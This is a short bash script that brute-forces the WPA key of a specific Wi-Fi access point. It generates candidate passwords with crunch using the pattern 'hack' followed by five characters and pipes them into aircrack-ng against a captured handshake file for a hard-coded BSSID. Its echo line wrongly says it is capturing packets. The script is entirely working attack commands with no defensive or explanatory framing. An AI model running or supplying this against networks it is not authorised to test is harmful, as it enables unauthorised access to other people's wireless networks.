#!/bin/bash
echo "\e[96mcapturing packets from monitor device:\e[0m"
capfile="$(find /root/Downloads/captures/ -type f -name '*.cap')"
macaddr="1C:23:2C:B7:D0:29"
crunch 9 9 acehkmnr123 -t hack@@@@@ | aircrack-ng $capfile -b $macaddr -w -
sleep 5
